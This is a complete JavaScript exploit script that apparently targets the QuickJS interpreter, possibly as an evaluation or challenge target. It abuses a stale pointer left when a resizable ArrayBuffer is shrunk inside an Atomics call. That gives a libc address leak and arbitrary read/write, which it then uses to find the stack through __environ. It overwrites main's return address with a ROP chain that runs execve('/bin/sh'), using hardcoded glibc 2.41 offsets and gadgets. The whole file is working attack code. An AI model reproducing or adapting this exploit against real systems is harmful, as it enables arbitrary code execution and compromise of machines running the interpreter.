// exec-shell-relro exploit (Full RELRO):
// Atomics + ResizableArrayBuffer stale-pointer => libc leak + stack ROP => execve("/bin/sh", ...)
import * as std from 'std';

// glibc 2.41 offsets (eval image)
const UNSORTED_BIN_FD_OFF = 0x1e7b20n; // &main_arena + 0x60
const ENVIRON_GOT_OFF     = 0x1e6fa0n; // GOT slot for __environ (copy reloc -> main executable)
const RET_MAIN_OFF        = 0x29ca8n;  // return address for qjs main() (after call rax in __libc_start_call_main)

// ROP gadgets / symbols in libc
const POP_RDI_RET_OFF     = 0x2a145n;
const POP_RSI_RET_OFF     = 0x2baa9n;
const POP_RDX_RBX_RET_OFF = 0x8f0c5n;
const RET_OFF             = 0x2846bn;
const EXECVE_OFF          = 0xdddd0n;
const BINSH_OFF           = 0x1a7ea4n;

function make_ptr_primitive(target_ptr, backing_size) {
  let ab = new ArrayBuffer(backing_size, { maxByteLength: backing_size });
  new BigInt64Array(ab); // prewarm shape
  let out;

  let trig = new ArrayBuffer(0x150, { maxByteLength: 0x150 });
  let ta = new BigInt64Array(trig);
  new ArrayBuffer(0x1000); // barrier

  let obj = {
    valueOf() {
      trig.resize(0x100);
      out = new BigInt64Array(ab);
      return target_ptr;
    }
  };

  // (0x110 + 0x38)/8 = 0x29
  Atomics.store(ta, 0x29, obj);
  return out;
}

// ------------------ Stage 1: libc base leak via unsorted-bin fd ------------------
let leak_ab = new ArrayBuffer(0x5000, { maxByteLength: 0x5000 });
let leak_ta = new BigInt64Array(leak_ab);
new ArrayBuffer(0x1000); // barrier

let leak_obj = {
  valueOf() {
    leak_ab.resize(0x100);
    return 0n;
  }
};

let unsorted_fd = Atomics.compareExchange(leak_ta, 0x22, leak_obj, 0n);
let libc_base = unsorted_fd - UNSORTED_BIN_FD_OFF;

// ------------------ Stage 2: libc R/W primitive ------------------
let rw = make_ptr_primitive(libc_base, 0x400000);

// ------------------ Stage 3: leak environ pointer (stack) ------------------
let environ_var_addr = Atomics.load(rw, Number(ENVIRON_GOT_OFF / 8n));
let exe_rw = make_ptr_primitive(environ_var_addr, 0x1000);
let environ_ptr = Atomics.load(exe_rw, 0);

// ------------------ Stage 4: map a stack window and patch main ret ------------------
const STACK_SPAN = 0x8000n; // 32KB
let stack_base = environ_ptr - STACK_SPAN;
let stk = make_ptr_primitive(stack_base, Number(STACK_SPAN));

let ret_main = libc_base + RET_MAIN_OFF;
let count = Number(STACK_SPAN / 8n);

let chosen = -1;
for (let i = 0; i < count - 16; i++) {
  if (Atomics.load(stk, i) === ret_main) {
    // Prefer candidates closest to environ_ptr (highest stack address) to avoid clobbering live frames.
    let next = Atomics.load(stk, i + 1);
    let okNext = (next >= stack_base && next < (stack_base + STACK_SPAN));
    if (okNext) chosen = i; // keep latest ok candidate
  }
}
if (chosen < 0) {
  // fallback: pick last occurrence regardless
  for (let i = 0; i < count - 16; i++) {
    if (Atomics.load(stk, i) === ret_main) chosen = i;
  }
}
if (chosen < 0) throw new Error('retaddr not found');

// ROP chain: execve("/bin/sh", ["/bin/sh", NULL], environ_ptr)
let ret_align = libc_base + RET_OFF;
let pop_rdi   = libc_base + POP_RDI_RET_OFF;
let pop_rsi   = libc_base + POP_RSI_RET_OFF;
let pop_rdxrbx= libc_base + POP_RDX_RBX_RET_OFF;
let execve    = libc_base + EXECVE_OFF;
let binsh     = libc_base + BINSH_OFF;

let argv_idx = chosen + 9;
let argv_addr = stack_base + 8n * BigInt(argv_idx);

function s(i, v) { Atomics.store(stk, i, v); }

s(chosen + 0, ret_align);
s(chosen + 1, pop_rdi);
s(chosen + 2, binsh);
s(chosen + 3, pop_rsi);
s(chosen + 4, argv_addr);
s(chosen + 5, pop_rdxrbx);
s(chosen + 6, environ_ptr);
s(chosen + 7, 0n);
s(chosen + 8, execve);
s(chosen + 9, binsh);
s(chosen + 10, 0n);

// Script ends; qjs main() returns and we execve /bin/sh.
